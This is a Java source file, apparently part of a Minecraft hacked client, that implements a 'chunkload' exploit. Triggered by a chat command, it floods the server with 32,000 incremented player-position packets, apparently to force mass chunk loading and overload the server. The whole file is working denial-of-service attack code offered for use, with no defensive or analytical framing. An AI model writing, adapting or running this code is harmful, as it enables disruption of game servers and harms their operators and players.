package wtf.norma.nekito.exploit.impl.other;

import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition;
import wtf.norma.nekito.exception.ExploitException;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.helper.ChatHelper;
import wtf.norma.nekito.helper.network.NetHelper;

@ExploitInfo(
        name = "chunkload",
        type = ExploitType.OTHER,
        usage = ".exploit chunkload",
        description = "LOL"
)
public class ChunkLoadExploit extends Exploit {

    @Override
    public void execute(Object... args) throws ExploitException {
        ChatHelper.printMessage(String.format("Executing &8[&7Method: &d%s&7", getName()));
        long start = System.currentTimeMillis();

        double x = mc.thePlayer.posX;
        double y = mc.thePlayer.posY;
        double z = mc.thePlayer.posZ;

        for (int j = 0; j < 32000; j++) {
            NetHelper.sendPacket(new C04PacketPlayerPosition(x++, y >= 255 ? 255 : y++, z++, true));
        }

        ChatHelper.printMessage(String.format("Execution completed &8[&7Method: &d%s&7, Time: &d%sms&8]", getName(), System.currentTimeMillis() - start));
    }
}
